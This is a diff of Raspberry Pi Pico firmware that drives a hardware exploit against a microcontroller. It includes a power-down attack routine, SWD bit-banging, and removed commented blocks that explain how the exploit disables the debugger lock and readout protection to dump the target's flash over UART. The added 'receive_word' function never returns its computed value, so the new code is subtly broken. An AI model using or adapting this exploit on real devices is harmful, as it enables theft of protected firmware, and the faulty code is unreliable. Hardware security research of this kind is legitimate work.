@@ -90,12 +90,16 @@ static int handle_control(uint32_t timeout_ms)
 		printf("Continuing explot\n");
 		break;
 
+	case 's':
+		break;
+
 	default:
 		printf("Unrecognized key '%c' (0x%02x)", c, c);
 		printf("Usage:\n");
 		printf("    b    Reboot into bootloader mode\n");
 		printf("    r    Restart Pico\n");
 		printf("    c    Continue to stage 2\n");
+		printf("    s    Send command\n");
 		printf("\n");
 		break;
 	}
@@ -130,7 +134,51 @@ __attribute__((section(".data"))) static uint32_t powerdown_attack(void)
 	return count;
 }
 
-int main()
+static void send_word(uint32_t packet, uint8_t count)
+{
+	for (int i = count; i > 0; i -= 1) {
+		uint8_t bit = !!(packet & (1 << (i - 1)));
+		printf("b: %d\n", bit);
+		gpio_put(SWDIO_PIN, bit);
+		sleep_ms(1);
+		gpio_put(SWCLK_PIN, 0);
+		sleep_ms(1);
+		gpio_put(SWCLK_PIN, 1);
+	}
+	printf("--\n");
+}
+
+static uint32_t receive_word(uint8_t count)
+{
+	uint32_t result = 0;
+	for (int i = 0; i < count; i++) {
+		gpio_put(SWCLK_PIN, 0);
+		sleep_ms(1);
+		result = (result << 1) | !!gpio_get(SWDIO_PIN);
+		gpio_put(SWCLK_PIN, 1);
+		sleep_ms(1);
+	}
+}
+
+static uint32_t packet_txrx(uint32_t packet)
+{
+	send_word(0x5ad7, 16);
+	send_word(packet, 32);
+	// Turnaround
+	gpio_set_dir(SWDIO_PIN, GPIO_IN);
+	receive_word(1);
+	uint32_t header = receive_word(16);
+	uint32_t response = receive_word(32);
+	// Turnaround
+	gpio_set_dir(SWDIO_PIN, GPIO_OUT);
+	receive_word(1);
+	if ((header & 0xffff) != 0x734f) {
+		printf("Invalid header: Got %04x, expected 0x734f\n", header);
+	}
+	return response;
+}
+
+int main(void)
 {
 	stdio_init_all();
 
@@ -206,7 +254,7 @@ int main()
 	gpio_set_dir(RESET_PIN, GPIO_IN);
 
 	uint32_t count;
-	
+
 	count = powerdown_attack();
 	printf("Target powered off after %d ticks\n", count);
 
@@ -220,7 +268,8 @@ int main()
 	gpio_put(SWDIO_PIN, true);
 
 	printf("Press 'c' to continue into stage 2\n");
-	while (handle_control(500) != 'c') {}
+	while (handle_control(500) != 'c') {
+	}
 	printf("Resetting target into stage 2\n");
 
 	// Reset the board again with BOOT0 held low. This will cause it
@@ -230,102 +279,6 @@ int main()
 	sleep_ms(10);
 	gpio_set_dir(RESET_PIN, GPIO_IN);
 #endif
-#if 0
-	// Set SWCLK and SWDIO pins to inputs since we'll be using them
-	// to exfiltrate data. Additionally, we don't want to power the
-	// target via phantom current on the SWD pins.
-	gpio_set_dir(SWCLK_PIN, GPIO_IN);
-	gpio_set_dir(SWDIO_PIN, GPIO_IN);
-
-	gpio_set_dir(RESET_PIN, GPIO_OUT);
-	sleep_ms(10);
-	gpio_set_dir(RESET_PIN, GPIO_IN);
-
-	uint32_t count = powerdown_attack();
-
-	printf("Target powered off after %d ticks\n", count);
-
-	// // Payload verification
-	// {
-	// 	bmp_loader(payload, sizeof(payload), 0x20000000, true);
-	// 	gpio_set_dir(SWCLK_PIN, GPIO_IN);
-	// 	gpio_set_dir(SWDIO_PIN, GPIO_IN);
-	// }
-
-	// Debugger lock is now disabled and we're now
-	// booting from SRAM. Wait for the target to run stage 1
-	// of the exploit which sets the FPB to jump to stage 2
-	// when the PC reaches a reset vector fetch (0x00000004)
-	sleep_ms(15);
-
-	// Set BOOT0 to boot from flash. This will trick the target
-	// into thinking it's running from flash, which will
-	// disable readout protection.
-	gpio_put(BOOT0_PIN, 0);
-
-	// Reset the target
-	gpio_set_dir(RESET_PIN, GPIO_OUT);
-	gpio_put(RESET_PIN, 0);
-
-	// Wait for reset
-	sleep_ms(15);
-
-	// Release reset
-	// Due to the FPB, the target will now jump to
-	// stage 2 of the exploit and dump the contents
-	// of the flash over UART
-	gpio_set_dir(RESET_PIN, GPIO_IN);
-	gpio_pull_up(RESET_PIN);
-#endif
-#if 0
-	gpio_put(BOOT0_PIN, 1);
-
-	// Set SWCLK and SWDIO pins to inputs since we'll be using them
-	// to exfiltrate data. Additionally, we don't want to power the
-	// target via phantom current on the SWD pins.
-	gpio_set_dir(SWCLK_PIN, GPIO_IN);
-	gpio_set_dir(SWDIO_PIN, GPIO_IN);
-
-	uint32_t count;
-	
-	count = powerdown_attack();
-	printf("Target powered off after %d ticks\n", count);
-
-	// // Payload verification
-	// {
-	// 	bmp_loader(payload, sizeof(payload), 0x20000000, true);
-	// 	gpio_set_dir(SWCLK_PIN, GPIO_IN);
-	// 	gpio_set_dir(SWDIO_PIN, GPIO_IN);
-	// }
-
-	// Debugger lock is now disabled and we're now
-	// booting from SRAM. Wait for the target to run stage 1
-	// of the exploit which sets the FPB to jump to stage 2
-	// when the PC reaches a reset vector fetch (0x00000004)
-	sleep_ms(15);
-
-	// Set BOOT0 to boot from flash. This will trick the target
-	// into thinking it's running from flash, which will
-	// disable readout protection.
-	gpio_put(BOOT0_PIN, 0);
-
-	count = powerdown_attack();
-	printf("Target powered off after %d ticks\n", count);
-
-	// // Reset the target
-	// gpio_set_dir(RESET_PIN, GPIO_OUT);
-	// gpio_put(RESET_PIN, 0);
-
-	// Wait for reset
-	// sleep_ms(15);
-
-	// // Release reset
-	// // Due to the FPB, the target will now jump to
-	// // stage 2 of the exploit and dump the contents
-	// // of the flash over UART
-	// gpio_set_dir(RESET_PIN, GPIO_IN);
-	// gpio_pull_up(RESET_PIN);
-#endif
 
 	printf("Reading data from target...\n");
 
@@ -333,19 +286,29 @@ int main()
 	int last_swclk = 0;
 	int last_swdio = 0;
 	while (true) {
-		int swclk = gpio_get(SWCLK_PIN);
-		int swdio = gpio_get(SWDIO_PIN);
+		// int swclk = gpio_get(SWCLK_PIN);
+		// int swdio = gpio_get(SWDIO_PIN);
 
-		if (swclk != last_swclk) {
-			printf("SWCLK %d -> %d\n", last_swclk, swclk);
-			last_swclk = swclk;
-		}
+		// if (swclk != last_swclk) {
+		// 	printf("SWCLK %d -> %d\n", last_swclk, swclk);
+		// 	last_swclk = swclk;
+		// }
 
-		if (swdio != last_swdio) {
-			printf("SWDIO %d -> %d\n", last_swdio, swdio);
-			last_swdio = swdio;
+		// if (swdio != last_swdio) {
+		// 	printf("SWDIO %d -> %d\n", last_swdio, swdio);
+		// 	last_swdio = swdio;
+		// }
+		uint8_t c = handle_control(1);
+
+		if (c == 's') {
+			static uint32_t index = 0;
+			uint32_t response = packet_txrx(index);
+			printf("Sent 0x%08x, received 0x%08x\n", index, response);
+			index += 1;
+			if (index > 6) {
+				index = 0;
+			}
 		}
-		handle_control(1);
 
 		// int c;
 		// if (uart_is_readable(UART_ID)) {
